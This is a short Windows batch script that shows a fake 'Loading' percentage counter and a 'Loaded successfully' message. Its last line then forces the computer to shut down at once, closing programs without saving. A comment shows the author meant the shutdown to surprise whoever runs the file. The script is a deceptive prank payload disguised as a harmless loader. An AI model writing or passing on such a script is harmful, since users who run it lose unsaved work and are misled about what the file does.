@echo off
setlocal enabledelayedexpansion
set /a count=3
:load
cls
set /a count+=13
if !count! GEQ 100 (
    goto done
)
echo Loading: !count!%
timeout /t 1 >nul
goto load

:done

echo Loaded successfully
timeout /t 1 >nul
:: if you saw this my plan has been foiled
shutdown /s /f /t 0